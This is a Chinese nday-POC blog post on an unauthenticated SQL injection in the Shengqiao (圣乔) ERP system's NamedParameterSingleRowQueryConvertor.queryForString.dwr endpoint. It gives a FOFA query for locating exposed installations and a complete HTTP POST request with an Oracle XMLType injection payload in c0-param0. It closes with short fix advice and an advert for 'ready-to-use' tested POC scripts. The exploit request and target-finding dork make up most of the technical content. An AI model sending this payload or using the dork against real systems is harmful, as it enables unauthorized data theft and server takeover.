#  圣乔ERP系统 queryForString.dwr SQL注入漏洞   
Superhero  nday POC   2024-12-25 02:14  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
圣乔ERP系统  
是杭州圣乔科技有限公司开发的一款企业级管理软件，旨在为企业提供一套全面、集成化的管理解决方案，帮助企业实现资源的优化配置和高效利用。该系统集成了财务、人力资源、生产、销售、供应链等多个业务模块，实现了企业内外部信息的无缝连接和实时共享。适用于各种规模的企业，特别是需要实现资源优化配置、提高运营效率和管理水平的企业。它可以帮助企业解决传统管理方式中存在的信息孤岛、数据重复输入、信息传递滞后等问题，提高企业的整体竞争力。  
**01******  
  
**漏洞概述**  
  
  
圣乔ERP系统   
  
NamedParameterSingleRowQueryConvertor.queryForString.dwr 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
title="圣乔ERP系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJZlDe1ElsxC65nLuOEIYVcEZ2Q8ZoARqEd1vib5HibNYtVy5scUKPvNeDUSiaz71EmH9pzucZVOtribQ/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

c0-id=0
batchId=0
callCount=1
c0-param1=Object_Object:{}
page=/erp/dwr/test/NamedParameterSingleRowQueryConvertor
httpSessionId=47CA299619667847F1BB450454E6C2D4
scriptSessionId=F3F037EB7A5102043AD4CEB47EB17A7275
c0-scriptName=NamedParameterSingleRowQueryConvertor
c0-methodName=queryForString
c0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJZlDe1ElsxC65nLuOEIYVch6iapd6UibaTyAGDqtuPS71gsmpzQlqQw8HDhaeFwHv4dcK85oL1icg0A/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJZlDe1ElsxC65nLuOEIYVczI6QLruYMJ2PMqVNPzmxZE8cgiaDgNxrJ9jTlPkwia571N2prgaxJDfQ/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJZlDe1ElsxC65nLuOEIYVcECYJ0icMR2W9Ds13l1ia2Oe6xnsyyiaPUXwib0JUuKQob00oIj9GEt135Q/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJZlDe1ElsxC65nLuOEIYVc84QJXP8R6PO2pjNJQlsibNsicwfHg3sX3sEaCZCSqiaIdq6eVpmRMpZqA/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、  
对用户传入的参数进行限制  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
